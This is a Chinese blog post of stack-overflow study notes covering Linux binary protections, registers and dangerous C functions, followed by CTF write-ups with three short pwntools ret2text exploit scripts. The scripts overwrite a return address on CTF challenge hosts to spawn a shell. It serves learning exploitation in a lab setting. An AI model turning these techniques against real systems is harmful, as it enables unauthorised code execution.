<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>简单的栈溢出 | Pdxbshx</title>
  <meta name="author" content="pdxbshx">
  
  <meta name="description" content="不需要去抱怨什么|">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="简单的栈溢出"/>
  <meta property="og:site_name" content="Pdxbshx"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="Pdxbshx" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-70812759-1');
</script>






<meta name="generator" content="Hexo 6.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">Pdxbshx</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class="fa fa-tags"></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class="fa fa-user"></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> 简单的栈溢出</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <h1 id="简单的栈溢出"><a href="#简单的栈溢出" class="headerlink" title="简单的栈溢出"></a>简单的栈溢出</h1><p>栈溢出的前提：<br>1.程序必须向栈上写入数据<br>2.写入的数据大小没有被良好的控制</p>
<p>stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example -no-pie<br>-m32 表示生成32位程序<br>-fno-stack-protector 表示不开启堆栈保护（不生成canary）<br>-no-pie 关闭PIE（避免加载基址被打乱）gcc -v查看默认的开关情况,若存在–enable-default-pie代表PIE默认开启</p>
<p>使用checksec检查编译出的文件<br>➜  stack-example checksec stack_example<br>Arch:   i386-32-little<br>RELRO:   Partial RELRO<br>Stack:   No canary found<br>NX:    NX enabled<br>PIE:    No PIE (0x8048000)<br>注意：<br>提到编译时的PIE保护，linux还存在地址空间分布随机化（ASLR），只有可执行文件开启了PIE保护，还需系统开启ASLR才会打乱基址，否则程序运行时依旧会加载一个固定的基址（和NO PIE基址不同），可以通过：<br>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space来控制 ASLR 启动与否，具体的选项有<br>0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。<br>1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。<br>2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。</p>
<p>IDA反编译工具</p>
<h2 id="栈溢出的重要步骤"><a href="#栈溢出的重要步骤" class="headerlink" title="栈溢出的重要步骤"></a>栈溢出的重要步骤</h2><p>1、寻找危险函数<br>输入：gets(直接读取一行，忽略’\x00’)、scanf、vscanf<br>输出：sprintf<br>字符串：strcpy(字符串复制，遇到’\x00’停止)、strcat(字符串拼接，遇到’\x00’停止)、bcopy<br>2、确定填充长度<br>计算我们所要操作的地址与我们所要覆盖的地址的距离，操作方法就是打开IDA，根据给定的地址计算偏移，一般变量会有以下几种索引模式：<br>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得<br>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。<br>直接地址索引，就相当于直接给定了地址。<br>一般来说，我们会有如下的覆盖需求：<br>覆盖函数返回地址，这时候就是直接看 EBP 即可。<br>覆盖栈上某个变量的内容，这时候就需要更加精细的计算了。<br>覆盖 bss 段某个变量的内容。<br>根据现实执行情况，覆盖特定的变量或地址的内容。<br>之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来直接或者间接地控制程序执行流程。</p>
<h1 id="自主学习部分"><a href="#自主学习部分" class="headerlink" title="自主学习部分"></a>自主学习部分</h1><p>1、Linux中的保护机制<br>①canary（栈保护）<br>原理：栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。<br>编译参数：-fno-stack-protector &#x2F;-fstack-protector &#x2F; -fstack-protector-all (关闭 &#x2F; 开启 &#x2F; 全开启)<br>②NX（no execute不可执行）<br>原理：将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。<br>编译参数：-z execstack &#x2F; -z noexecstack (关闭 &#x2F; 开启)<br>③PIE（position-independent executables，地址无关可执行文件）<br>原理：一个针对代码段.text, 数据段.*data，.bss等固定地址的一个防御技术。同ASLR同样，应用了PIE的程序会在每次加载时都变换加载基址，从而使位于程序自己的gadget也失效。<br>编译参数：-no-pie &#x2F; -pie (关闭 &#x2F; 开启)<br>④RELRO(read only relocation)<br>原理及介绍：在Linux系统安全领域，数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。 所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处。GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术:。大概实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读.设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。<br>编译参数：-z norelro &#x2F; -z lazy &#x2F; -z now (关闭 &#x2F; 部分开启 &#x2F; 完全开启)</p>
<p>2、ESP寄存器存储的是在调用函数fun()之后，栈的栈顶，并且始终指向栈顶。<br>EBP寄存器存储的是栈的栈底指针，通常叫栈基址，这个是一开始进行fun()函数调用之前，由ESP传递给EBP的。（在函数调用前你可以这么理解：ESP存储的是栈顶地址，也是栈底地址。）<br>EIP寄存器存储的是CPU下次要执行的指令的地址。<br>ECX一般用来当作计数器,EDX是数据寄存器,EAX是累加器,EBX是基址寄存器,  ESI是源变址寄存器,EDI是目的变址寄存器,ESP是堆栈指针寄存器,EBP是基址指针寄存器,其中ESP和EBP一般是针对堆栈而言。<br>push指的是入栈，在程序中常用来暂存某些数据<br>pop指的是出栈，可对数据进行恢复<br>call指的是将返回地址（也就是call指令要执行时EIP的值）压入栈顶，然后是将程序跳转到当前调用的方法的起始地址。<br>jz是ZF汇编语言中的PSW标志寄存器中的一位，JZ则是根据ZF决定是否跳转。若ZF&#x3D;1（表示本次运算结果为0，不为0则ZF&#x3D;0），则跳转，否则不跳转。</p>
<p>3、溢出分为缓冲区溢出、内存溢出、数据溢出<br>危险函数：<br>输入：gets(直接读取一行，忽略’\x00’)、scanf、vscanf<br>输出：sprintf<br>字符串：strcpy(字符串复制，遇到’\x00’停止)、strcat(字符串拼接，遇到’\x00’停止)、bcopy</p>
<p>4、GDB可以做四种主要的事情（加上支持这些的其他事情）来帮助你捕捉到行动中的错误：</p>
<ul>
<li>启动程序，指定可能影响其行为的任何内容。</li>
<li>使程序在指定条件下停止。</li>
<li>检查程序停止时发生了什么。</li>
<li>更改程序中的内容，以便您可以尝试纠正一个错误的影响，并继续了解另一个错误。</li>
</ul>
<p>jdb一般在IDE中自带、在linux环境下需要安装（Centos、Ubuntu自带）<br>若要调试程序，编译时还需要加上-g选项让编译生成的可执行文件中包含足够的调试信息，包含代码、栈、局部变量等，若还需查看更多信息如宏定义则需添加-g3选项，这样就可以通过print命令打印宏定义信息。</p>
<h1 id="刷题分享"><a href="#刷题分享" class="headerlink" title="刷题分享"></a>刷题分享</h1><h3 id="CTFHub—ret2text"><a href="#CTFHub—ret2text" class="headerlink" title="CTFHub—ret2text"></a>CTFHub—ret2text</h3><p>思路及解题步骤：</p>
<ul>
<li>首先对文件进行分析，获得的结果如下所示：</li>
</ul>
<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1.png"></p>
<ul>
<li>发现其为64位的文件</li>
</ul>
<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-2.png"></p>
<ul>
<li>发现没有开启任何的保护，将其直接代入IDA进行反汇编操作</li>
</ul>
<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-3.png"></p>
<ul>
<li>发现经典的gets危险函数，可以实现<strong>栈溢出</strong></li>
</ul>
<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-4.png"></p>
<ul>
<li>通过观察到secure函数中存在着&#x3D;&#x3D;system(“&#x2F;bin&#x2F;sh”)&#x3D;&#x3D;函数，以此我们可以找到system函数的地址，同时将v4的值进行溢出，返回执行指定的system函数</li>
</ul>
<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-5.png"></p>
<ul>
<li>获得的system函数的地址为0x004007b8</li>
</ul>
<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-6.png"></p>
<ul>
<li>由此我们可以计算对v4需要填充的无用数据长度为0x70+8,然后我们开始写exp：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn2&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;challenge-dda26e33984a0d6c.sandbox.ctfhub.com&quot;</span>,<span class="number">35387</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x70</span>+<span class="number">8</span>) + p64(<span class="number">0x004007B8</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<ul>
<li>由于之前已经打通，忘记了截图，直接在本地的机子上执行，运行结果如下所示：</li>
</ul>
<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-7.png"></p>
<h3 id="BUUCTF—pwn1-sctf-2016"><a href="#BUUCTF—pwn1-sctf-2016" class="headerlink" title="BUUCTF—pwn1_sctf_2016"></a>BUUCTF—pwn1_sctf_2016</h3><p>灵感来源: <a target="_blank" rel="noopener" href="https://blog.csdn.net/nicesa/article/details/107416316">https://blog.csdn.net/nicesa/article/details/107416316</a><br>思路及解题步骤：</p>
<ul>
<li>首先对文件进行分析：</li>
</ul>
<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-8.png"></p>
<ul>
<li>发现文件是一个32位的程序，同时开启了NX保护，将文件代入IDA进行反汇编操作</li>
</ul>
<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-9.png"></p>
<ul>
<li>由图可知,我们知道了对s变量开辟的空间为60个字节,但是fgets函数对我们限制输入32个字节,开始以为是不会造成<strong>栈溢出</strong>,但后面出现了字符替换,即将字符’I’替换成’you’,我们可以输入20个’I’,就可以实现<strong>栈溢出</strong>.</li>
</ul>
<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-10.png"></p>
<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-11.png"></p>
<ul>
<li>然后我们发现了get_flag函数，里面存在着system函数，就此我们可以找到system函数的地址：0x08048f0d</li>
</ul>
<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-12.png"></p>
<ul>
<li>接着我们就可以写exp</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn5&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27974</span>)</span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span> * <span class="number">20</span> + <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x4</span>)  + p32(<span class="number">0x08048f0d</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<ul>
<li>由于之前已经打通，直接在本机执行，执行结果如下：</li>
</ul>
<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-13.png"></p>
<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-14.png"></p>
<h3 id="BUUCTF—jarvisoj-level0"><a href="#BUUCTF—jarvisoj-level0" class="headerlink" title="BUUCTF—jarvisoj_level0"></a>BUUCTF—jarvisoj_level0</h3><p>思路及解题步骤：</p>
<ul>
<li>首先对文件进行分析，发现其是一个64位的文件，然后开起了NX保护</li>
</ul>
<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-15.png"></p>
<ul>
<li>同理将其代入IDA进行分析,我们发现在main函数中返回的是vulnerable_function函数，而在vulnerable_function函数中返回的是read(0, &amp;buf, 0x200uLL),由此我们可以对buf这个变量进行<strong>栈溢出</strong>,变量buf的空间为0x80h个字节，发现callsystem函数的地址为：0x00400596</li>
</ul>
<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-16.png"></p>
<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-17.png"></p>
<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-18.png"></p>
<ul>
<li>然后开始写exp：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./level0&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26668</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x88</span>) + p64(<span class="number">0x00400596</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<ul>
<li>由于之前已经打通，忘记截图，在本地的机子上执行结果如下：</li>
</ul>
<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/1-19.png"></p>
<h1 id="刷题总结"><a href="#刷题总结" class="headerlink" title="刷题总结"></a>刷题总结</h1><p>经过这几道题下来，容易确定下来栈溢出几个大方向的思路：</p>
<ul>
<li>没有PIE：ret2libc</li>
<li>NX关闭：ret2shellcode</li>
<li>其他思路：ret2csu、ret2text</li>
</ul>

	  <div class="article-footer-copyright">

    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
</div>

	</div>

	
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/uncategorized/第二周笔记/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> 上一页</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a type="button" class="btn btn-default disabled">下一页<i class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">留言</h2>

    
</section>

-->
	
	
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2022-11-07 
	</div>
	

	<!-- categories -->
    

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/栈溢出/">栈溢出<span>1</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2023 pdxbshx's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
